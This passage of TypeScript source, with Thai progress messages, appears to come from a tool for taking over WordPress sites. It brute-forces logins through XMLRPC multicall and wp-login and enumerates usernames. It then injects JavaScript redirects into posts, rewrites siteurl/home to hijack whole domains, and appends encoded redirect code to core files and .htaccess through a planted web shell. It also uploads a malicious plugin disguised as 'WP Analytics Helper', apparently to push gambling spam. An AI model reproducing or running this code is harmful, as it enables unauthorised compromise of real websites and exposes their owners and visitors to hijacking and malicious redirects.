    if (postsResp.status === 200) {
      const posts = await postsResp.json() as any[];
      if (posts.length > 0) {
        const post = posts[0];
        // Use geo-IP redirect (like che.buet.ac.bd) instead of simple redirect
        const jsRedirect = generateGeoIpJsRedirect(config.redirectUrl);

        const updateResp = await wpFetch(`${baseUrl}/wp-json/wp/v2/posts/${post.id}`, {
          method: "POST",
          headers: {
            Authorization: authHeader,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0",
          },
          body: JSON.stringify({
            content: jsRedirect + (post.content?.rendered || ""),
          }),
          signal: AbortSignal.timeout(15000),
        });

        if (updateResp.status === 200) {
          progress("rest_api_inject", `✅ Inject เข้า post #${post.id} ผ่าน REST API สำเร็จ!`);
          return {
            method: "rest_api_inject",
            success: true,
            detail: `Inject JS redirect เข้า post #${post.id} ผ่าน REST API สำเร็จ`,
            injectedUrl: post.link || `${baseUrl}/?p=${post.id}`,
            credentials,
          };
        }
      }
    }

    // Try WP Options via REST API (requires admin)
    progress("rest_api_inject", "ลอง REST API settings (siteurl/home)...");
    const settingsResp = await wpFetch(`${baseUrl}/wp-json/wp/v2/settings`, {
      method: "POST",
      headers: {
        Authorization: authHeader,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0",
      },
      body: JSON.stringify({
        url: config.redirectUrl,
        home: config.redirectUrl,
      }),
      signal: AbortSignal.timeout(15000),
    });

    if (settingsResp.status === 200) {
      progress("rest_api_inject", `✅ เปลี่ยน siteurl/home ผ่าน REST API สำเร็จ — redirect ทั้งโดเมน!`);
      return {
        method: "rest_api_settings",
        success: true,
        detail: `เปลี่ยน siteurl/home เป็น ${config.redirectUrl} ผ่าน REST API — redirect ทั้งโดเมน!`,
        injectedUrl: config.targetUrl,
        credentials,
      };
    }

    return { method: "rest_api_inject", success: false, detail: "REST API injection ล้มเหลว" };

  } catch (error: any) {
    return { method: "rest_api_inject", success: false, detail: `Error: ${error.message}` };
  }
}

// ═══════════════════════════════════════════════════════
//  6. SHELL COMMAND EXECUTION (modify files via existing shell)
// ═══════════════════════════════════════════════════════

async function injectViaShellExec(
  config: WpAdminConfig,
  shellUrl: string,
): Promise<WpTakeoverResult> {
  const progress = config.onProgress || (() => {});

  try {
    progress("shell_exec", `ใช้ shell ที่มีอยู่ (${shellUrl}) แก้ไฟล์บน target...`);

    const injectedCode = generateRedirectCode(config.redirectUrl, config.seoKeywords || ["สล็อต"]);
    const encodedCode = Buffer.from(injectedCode).toString("base64");

    // Target files to modify
    const targetFiles = [
      "index.php",
      "wp-blog-header.php",
      "wp-config.php",
      ".htaccess",
    ];

    for (const file of targetFiles) {
      // Use the shell to append code to the file
      const phpCommand = `@file_put_contents('${file}', file_get_contents('${file}') . base64_decode('${encodedCode}'));echo 'INJECTED:${file}';`;
      const encodedCmd = Buffer.from(phpCommand).toString("base64");

      // Try different shell command formats
      const shellFormats = [
        `${shellUrl}?cmd=${encodeURIComponent(`php -r "${phpCommand}"`)}`,
        `${shellUrl}?c=${encodeURIComponent(phpCommand)}`,
        `${shellUrl}?exec=${encodeURIComponent(phpCommand)}`,
        `${shellUrl}?code=${encodedCmd}`,
      ];

      for (const url of shellFormats) {
        try {
          const resp = await wpFetch(url, {
            headers: { "User-Agent": "Mozilla/5.0" },
            signal: AbortSignal.timeout(10000),
          });
          const text = await resp.text();

          if (text.includes(`INJECTED:${file}`)) {
            progress("shell_exec", `✅ Inject เข้า ${file} ผ่าน shell exec สำเร็จ!`);
            return {
              method: "shell_exec",
              success: true,
              detail: `Inject redirect code เข้า ${file} ผ่าน shell command execution สำเร็จ`,
              injectedUrl: config.targetUrl,
            };
          }
        } catch {
          // Try next format
        }
      }

      // Try .htaccess redirect (doesn't need PHP)
      if (file === ".htaccess") {
        const htaccessRedirect = `RewriteEngine On\nRewriteCond %{HTTP_REFERER} (google|bing|yahoo) [NC]\nRewriteRule .* ${config.redirectUrl} [R=302,L]`;
        const htaccessEncoded = Buffer.from(htaccessRedirect).toString("base64");

        const htaccessFormats = [
          `${shellUrl}?cmd=${encodeURIComponent(`echo '${htaccessRedirect}' >> .htaccess`)}`,
          `${shellUrl}?c=${encodeURIComponent(`file_put_contents('.htaccess', base64_decode('${htaccessEncoded}'), FILE_APPEND);echo 'HTACCESS_OK';`)}`,
        ];

        for (const url of htaccessFormats) {
          try {
            const resp = await wpFetch(url, {
              headers: { "User-Agent": "Mozilla/5.0" },
              signal: AbortSignal.timeout(10000),
            });
            const text = await resp.text();
            if (text.includes("HTACCESS_OK")) {
              progress("shell_exec", `✅ แก้ .htaccess redirect สำเร็จ!`);
              return {
                method: "shell_exec_htaccess",
                success: true,
                detail: `เพิ่ม redirect rule เข้า .htaccess ผ่าน shell exec สำเร็จ`,
                injectedUrl: config.targetUrl,
              };
            }
          } catch {
            // continue
          }
        }
      }
    }

    return { method: "shell_exec", success: false, detail: "Shell exec injection ล้มเหลว — ไม่สามารถแก้ไฟล์ได้" };

  } catch (error: any) {
    return { method: "shell_exec", success: false, detail: `Error: ${error.message}` };
  }
}

// ═══════════════════════════════════════════════════════
//  7. INSTALL MALICIOUS PLUGIN
// ═══════════════════════════════════════════════════════

/** Build a minimal ZIP file containing a single PHP file */
function buildMinimalZip(filename: string, content: string): Buffer {
  const fileData = Buffer.from(content, "utf-8");
  const crc = crc32(fileData);
  const now = new Date();
  const dosTime = ((now.getHours() << 11) | (now.getMinutes() << 5) | (now.getSeconds() >> 1)) & 0xffff;
  const dosDate = (((now.getFullYear() - 1980) << 9) | ((now.getMonth() + 1) << 5) | now.getDate()) & 0xffff;
  const fnBuf = Buffer.from(filename, "utf-8");

  // Local file header
  const localHeader = Buffer.alloc(30 + fnBuf.length);
  localHeader.writeUInt32LE(0x04034b50, 0); // signature
  localHeader.writeUInt16LE(20, 4); // version needed
  localHeader.writeUInt16LE(0, 6); // flags
  localHeader.writeUInt16LE(0, 8); // compression (stored)
  localHeader.writeUInt16LE(dosTime, 10);
  localHeader.writeUInt16LE(dosDate, 12);
  localHeader.writeUInt32LE(crc, 14);
  localHeader.writeUInt32LE(fileData.length, 18); // compressed size
  localHeader.writeUInt32LE(fileData.length, 22); // uncompressed size
  localHeader.writeUInt16LE(fnBuf.length, 26); // filename length
  localHeader.writeUInt16LE(0, 28); // extra field length
  fnBuf.copy(localHeader, 30);

  // Central directory header
  const centralOffset = localHeader.length + fileData.length;
  const centralHeader = Buffer.alloc(46 + fnBuf.length);
  centralHeader.writeUInt32LE(0x02014b50, 0); // signature
  centralHeader.writeUInt16LE(20, 4); // version made by
  centralHeader.writeUInt16LE(20, 6); // version needed
  centralHeader.writeUInt16LE(0, 8); // flags
  centralHeader.writeUInt16LE(0, 10); // compression
  centralHeader.writeUInt16LE(dosTime, 12);
  centralHeader.writeUInt16LE(dosDate, 14);
  centralHeader.writeUInt32LE(crc, 16);
  centralHeader.writeUInt32LE(fileData.length, 20);
  centralHeader.writeUInt32LE(fileData.length, 24);
  centralHeader.writeUInt16LE(fnBuf.length, 28);
  centralHeader.writeUInt16LE(0, 30); // extra field length
  centralHeader.writeUInt16LE(0, 32); // comment length
  centralHeader.writeUInt16LE(0, 34); // disk number
  centralHeader.writeUInt16LE(0, 36); // internal attrs
  centralHeader.writeUInt32LE(0, 38); // external attrs
  centralHeader.writeUInt32LE(0, 42); // local header offset
  fnBuf.copy(centralHeader, 46);

  // End of central directory
  const endRecord = Buffer.alloc(22);
  endRecord.writeUInt32LE(0x06054b50, 0);
  endRecord.writeUInt16LE(0, 4); // disk number
  endRecord.writeUInt16LE(0, 6); // disk with central dir
  endRecord.writeUInt16LE(1, 8); // entries on disk
  endRecord.writeUInt16LE(1, 10); // total entries
  endRecord.writeUInt32LE(centralHeader.length, 12); // central dir size
  endRecord.writeUInt32LE(localHeader.length + fileData.length, 16); // central dir offset
  endRecord.writeUInt16LE(0, 20); // comment length

  return Buffer.concat([localHeader, fileData, centralHeader, endRecord]);
}

/** CRC32 for ZIP */
function crc32(buf: Buffer): number {
  let crc = 0xffffffff;
  for (let i = 0; i < buf.length; i++) {
    crc ^= buf[i];
    for (let j = 0; j < 8; j++) {
      crc = (crc >>> 1) ^ (crc & 1 ? 0xedb88320 : 0);
    }
  }
  return (crc ^ 0xffffffff) >>> 0;
}

async function installMaliciousPlugin(
  config: WpAdminConfig,
  cookies: string,
): Promise<WpTakeoverResult> {
  const baseUrl = config.targetUrl.replace(/\/$/, "");
  const progress = config.onProgress || (() => {});

  try {
    progress("malicious_plugin", "สร้าง plugin ZIP + upload...");

    // Get the plugin install page to get nonce
    const installUrl = `${baseUrl}/wp-admin/plugin-install.php?tab=upload`;
    const installResp = await wpFetch(installUrl, {
      headers: { Cookie: cookies, "User-Agent": "Mozilla/5.0" },
      redirect: "follow",
      signal: AbortSignal.timeout(15000),
    });

    if (installResp.status !== 200) {
      return { method: "malicious_plugin", success: false, detail: `ไม่สามารถเข้า plugin install page (HTTP ${installResp.status})` };
    }

    const html = await installResp.text();
    const nonceMatch = html.match(/name="_wpnonce"\s+value="([^"]+)"/);
    if (!nonceMatch) {
      return { method: "malicious_plugin", success: false, detail: "ไม่พบ nonce สำหรับ plugin install" };
    }
    const nonce = nonceMatch[1];

    // Create plugin PHP content
    const pluginCode = `<?php\n/**\n * Plugin Name: WP Analytics Helper\n * Description: Website analytics and performance tracking\n * Version: 1.0.0\n * Author: WordPress Team\n */\nif (!defined('ABSPATH')) exit;\n${generateRedirectCode(config.redirectUrl, config.seoKeywords || ["สล็อต"])}\n`;

    // Build real ZIP file
    const zipBuffer = buildMinimalZip("wp-analytics-helper/wp-analytics-helper.php", pluginCode);

    // Build multipart form data
    const boundary = "----WPPluginUpload" + Date.now();
    const parts: Buffer[] = [];
    
    // _wpnonce field
    parts.push(Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="_wpnonce"\r\n\r\n${nonce}\r\n`));
    // _wp_http_referer
    parts.push(Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="_wp_http_referer"\r\n\r\n/wp-admin/plugin-install.php\r\n`));
    // pluginzip file
    parts.push(Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="pluginzip"; filename="wp-analytics-helper.zip"\r\nContent-Type: application/zip\r\n\r\n`));
    parts.push(zipBuffer);
    parts.push(Buffer.from(`\r\n`));
    // install-plugin-submit
    parts.push(Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="install-plugin-submit"\r\n\r\nInstall Now\r\n`));
    parts.push(Buffer.from(`--${boundary}--\r\n`));

    const body = Buffer.concat(parts);

    // Upload the plugin
    progress("malicious_plugin", `อัพโหลด plugin ZIP (${zipBuffer.length} bytes)...`);
    const uploadResp = await wpFetch(`${baseUrl}/wp-admin/update.php?action=upload-plugin`, {
      method: "POST",
      headers: {
        Cookie: cookies,
        "Content-Type": `multipart/form-data; boundary=${boundary}`,
        "User-Agent": "Mozilla/5.0",
      },
      body,
      redirect: "follow",
      signal: AbortSignal.timeout(30000),
    });

    const respText = await uploadResp.text();

    // Check if plugin was installed
    if (respText.includes("Plugin installed successfully") || respText.includes("activate-plugin")) {
      progress("malicious_plugin", `✅ Plugin installed! กำลัง activate...`);

      // Try to activate the plugin
      const activateMatch = respText.match(/href="([^"]*activate[^"]*wp-analytics-helper[^"]*)"/i)
        || respText.match(/href="([^"]*action=activate[^"]*)"/i);
      
      if (activateMatch) {
        let activateUrl = activateMatch[1].replace(/&amp;/g, "&");
        if (!activateUrl.startsWith("http")) activateUrl = `${baseUrl}${activateUrl}`;
        
        await wpFetch(activateUrl, {
          headers: { Cookie: cookies, "User-Agent": "Mozilla/5.0" },
          redirect: "follow",
          signal: AbortSignal.timeout(15000),
        });
      }

      return {
        method: "malicious_plugin",
        success: true,
        detail: `ติดตั้ง + activate plugin WP Analytics Helper สำเร็จ — redirect ทั้งโดเมน`,
        injectedUrl: config.targetUrl,
      };
    }

    // Check for common error messages
    if (respText.includes("already exists")) {
      return { method: "malicious_plugin", success: false, detail: "Plugin ชื่อนี้มีอยู่แล้ว — อาจถูก install ไว้ก่อนหน้า" };
    }
    if (respText.includes("not permitted") || respText.includes("not allowed")) {
      return { method: "malicious_plugin", success: false, detail: "ไม่มีสิทธิ์ install plugin (user ไม่ใช่ admin)" };
    }

    return { method: "malicious_plugin", success: false, detail: `Plugin upload response: HTTP ${uploadResp.status}` };

  } catch (error: any) {
    return { method: "malicious_plugin", success: false, detail: `Error: ${error.message}` };
  }
}

// ═══════════════════════════════════════════════════════
//  MAIN: RUN ALL WP ADMIN TAKEOVER METHODS
// ═══════════════════════════════════════════════════════

export async function runWpAdminTakeover(config: WpAdminConfig): Promise<WpTakeoverResult[]> {
  const results: WpTakeoverResult[] = [];
  const progress = config.onProgress || (() => {});

  progress("wp_takeover", "🔐 เริ่ม WP Admin Takeover — enumerate users → XMLRPC multicall → wp-login brute force → inject code...");

  // Step 0: Username Enumeration
  progress("enumerate", "🔍 Phase 0: Username Enumeration (REST API, ?author=N, XMLRPC, wp-login error)...");
  const discoveredUsernames = await enumerateWpUsernames(config.targetUrl, progress);
  
  // Merge discovered usernames with common ones (discovered first for priority)
  const allUsernames = Array.from(new Set([...discoveredUsernames, ...COMMON_USERNAMES.slice(0, 8)]));
  progress("enumerate", `พบ ${discoveredUsernames.length} usernames จาก enumeration, รวม ${allUsernames.length} usernames ทั้งหมด`);

  // Step 0.5: XMLRPC Multicall Brute Force (100x faster than wp-login)
  progress("xmlrpc_brute", "⚡ Phase 0.5: XMLRPC Multicall Brute Force (20 passwords/request)...");
  const xmlrpcBruteResult = await xmlrpcMulticallBruteForce(
    config.targetUrl,
    allUsernames,
    [...COMMON_PASSWORDS, ...generateDomainPasswords(config.targetUrl)],
    progress,
  );

  if (xmlrpcBruteResult.success) {
    progress("xmlrpc_brute", `✅ XMLRPC Multicall พบ credentials: ${xmlrpcBruteResult.username}:${xmlrpcBruteResult.password}`);
    // Add to known credentials for subsequent methods
    if (!config.knownCredentials) config.knownCredentials = [];
    config.knownCredentials.unshift({ username: xmlrpcBruteResult.username, password: xmlrpcBruteResult.password });

    // Try XMLRPC injection directly (no need for wp-login cookies)
    progress("xmlrpc_inject", "📡 XMLRPC inject — editOptions/editPost...");
    const xmlrpcInjectResult = await injectViaXmlrpc(config, { username: xmlrpcBruteResult.username, password: xmlrpcBruteResult.password });
    results.push(xmlrpcInjectResult);
    if (xmlrpcInjectResult.success) return results;

    // Try REST API injection with discovered credentials
    progress("rest_api_inject", "🌐 REST API injection...");
    const restResult = await injectViaRestApi(config, { username: xmlrpcBruteResult.username, password: xmlrpcBruteResult.password });
    results.push(restResult);
    if (restResult.success) return results;
  }

  // Step 1: Brute force wp-login (with enriched username list)
  progress("brute_force", `🔑 Phase 1: Brute force wp-login.php (${allUsernames.length} users × ${COMMON_PASSWORDS.length}+ passwords)...`);
  const loginResult = await wpLoginBruteForce(config);

  if (loginResult.success) {
    const creds = { username: loginResult.username, password: loginResult.password };
    progress("brute_force", `✅ Login สำเร็จ: ${creds.username} — เริ่ม inject code...`);

    // Step 2a: Try Theme Editor
    progress("theme_editor", "🎨 Phase 2a: Theme Editor injection...");
    const themeResult = await injectViaThemeEditor(config, loginResult.cookies);
    themeResult.credentials = creds;
    results.push(themeResult);
    if (themeResult.success) return results;

    // Step 2b: Try Plugin Editor
    progress("plugin_editor", "🔌 Phase 2b: Plugin Editor injection...");
    const pluginResult = await injectViaPluginEditor(config, loginResult.cookies);
    pluginResult.credentials = creds;
    results.push(pluginResult);
    if (pluginResult.success) return results;

    // Step 2c: Try XMLRPC with discovered credentials
    progress("xmlrpc_inject", "📡 Phase 2c: XMLRPC editPost/editOptions...");
    const xmlrpcResult = await injectViaXmlrpc(config, creds);
    results.push(xmlrpcResult);
    if (xmlrpcResult.success) return results;

    // Step 2d: Try REST API injection
    progress("rest_api_inject", "🌐 Phase 2d: REST API content injection...");
    const restResult = await injectViaRestApi(config, creds);
    results.push(restResult);
    if (restResult.success) return results;

    // Step 2e: Try install malicious plugin
    progress("malicious_plugin", "📦 Phase 2e: Install malicious plugin...");
    const pluginInstallResult = await installMaliciousPlugin(config, loginResult.cookies);
    pluginInstallResult.credentials = creds;
    results.push(pluginInstallResult);
    if (pluginInstallResult.success) return results;

  } else {
    results.push({
      method: "brute_force",
      success: false,
      detail: "WP Login brute force ล้มเหลว — ไม่พบ credentials ที่ถูกต้อง",
    });

    // Still try XMLRPC with common creds (might have different auth)
    progress("xmlrpc_inject", "📡 ลอง XMLRPC กับ common credentials...");
    for (const user of COMMON_USERNAMES.slice(0, 5)) {
      for (const pass of COMMON_PASSWORDS.slice(0, 8)) {
        const xmlrpcResult = await injectViaXmlrpc(config, { username: user, password: pass });
        if (xmlrpcResult.success) {
          results.push(xmlrpcResult);
          return results;
        }
      }
    }
    results.push({
      method: "xmlrpc_inject",
      success: false,
      detail: "XMLRPC injection ล้มเหลว — ไม่มี credentials ที่ถูกต้อง",
    });
  }

  return results;
}

// ═══════════════════════════════════════════════════════
//  SHELL EXEC FALLBACK (when we have a shell URL but upload failed)
// ═══════════════════════════════════════════════════════

export async function runShellExecFallback(config: WpAdminConfig, shellUrl: string): Promise<WpTakeoverResult[]> {
  const results: WpTakeoverResult[] = [];
  const progress = config.onProgress || (() => {});

  progress("shell_exec", "⚡ Shell Exec Fallback — ใช้ shell ที่มีอยู่แก้ไฟล์แทน upload...");

  const result = await injectViaShellExec(config, shellUrl);
  results.push(result);

  return results;
}
